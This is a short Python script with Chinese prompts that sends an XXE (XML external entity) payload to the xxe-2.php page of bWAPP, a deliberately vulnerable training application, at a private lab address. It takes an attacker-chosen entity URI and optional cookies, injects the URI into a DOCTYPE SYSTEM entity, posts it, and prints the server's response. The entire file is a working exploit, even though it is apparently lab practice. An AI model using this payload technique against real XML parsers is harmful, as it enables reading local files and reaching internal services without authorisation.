# coding:utf-8
import requests
import json


url = 'http://192.168.133.128/bWAPP/bWAPP/xxe-2.php'
headers = {'Content-type':'text/xml'}

payload = input('请输入payload（例http://localhost/bWAPP/bWAPP/robots.txt）：')
if(payload == ''):
    print("请输入payload！")
    exit()
else:
   data =  '<?xml version="1.0" encoding="utf-8"?> <!DOCTYPE root [<!ENTITY bWAPP SYSTEM "'+payload+'">]> <reset><login>&bWAPP;</login><secret>blah</secret></reset>'



cookies={}
states = input('是否含有cookie（Y/N）：')
if(states == 'y' or states == 'Y'):
    cookies_str = input('输入cookies(字符1:值1,字符2:值2)：').split(",")
    for i in cookies_str:
        keyvalue = i.split(":")
        cookies[keyvalue[0]] = keyvalue[1]
else:
    pass

r = requests.post(url, data=data, cookies=cookies,headers=headers)
print(r.text)

